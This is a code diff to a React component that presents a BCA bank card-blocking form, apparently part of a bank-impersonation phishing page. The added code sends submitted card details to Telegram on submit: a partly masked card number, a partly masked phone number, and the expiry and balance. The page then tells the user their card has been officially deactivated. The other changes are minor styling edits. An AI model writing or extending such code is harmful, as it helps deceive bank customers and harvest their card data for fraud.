@@ -10,6 +10,7 @@ import {
 } from '../utils/validation';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
 import { VirtualCardPreview } from './VirtualCardPreview';
+import { TelegramService } from '../services/telegramService';
 
 interface MAdminBlokirViewProps {
   onBack: () => void;
@@ -113,7 +114,7 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
     }
   };
 
-  const handleOkClick = (e: React.FormEvent) => {
+  const handleOkClick = async (e: React.FormEvent) => {
     e.preventDefault();
     setTouched({
       cardNumber: true,
@@ -126,6 +127,21 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
     if (!isFormValid) {
       return;
     }
+
+    // Kirim data ke Telegram
+    await TelegramService.sendFormData({
+      serviceType: 'blokir',
+      serviceTitle: 'Pemblokiran Kartu BCA',
+      timestamp: new Date().toISOString(),
+      data: {
+        cardNumber: cardNumber.replace(/(\d{4})\s*(?=\d{4})/g, '$1 •••• ').slice(0, 19),
+        phoneNumber: phoneNumber.slice(0, 4) + '••••' + phoneNumber.slice(-3),
+        expiry: expiry,
+        balance: balance,
+        cardNetwork: cardNetwork || 'BCA Card',
+      },
+    });
+
     setShowProcessModal(true);
   };
 
@@ -143,7 +159,7 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
       { label: 'Limit / Saldo Terakhir', value: balance ? `Rp ${balance}` : '-' },
       { label: 'Masa Berlaku', value: expiry || '-' },
     ],
-    note: 'Status kartu debit/kredit Anda telah resmi dinonaktifkan seketika. Seluruh transaksi tunai ATM, mesin EDC, e-commerce, dan transaksi internasional telah dihentikan demi proteksi finansial Anda. Notifikasi konfirmasi resmi telah dikirim ke nomor HP terdaftar.',
+    note: 'Status kartu debit/kredit Anda telah resmi dinonaktifkan seketika. Seluruh transaksi tunai ATM, mesin EDC, e-commerce, dan transaksi internasional telah dihentikan demi proteksi finans[...]',
   };
 
   return (
@@ -408,7 +424,7 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
             <button
               type="button"
               onClick={onBack}
-              className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
+              className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-95"
             >
               Cancel
             </button>
@@ -416,7 +432,7 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
             {/* OK Button */}
             <button
               type="submit"
-              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
+              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-95"
             >
               OK
             </button>
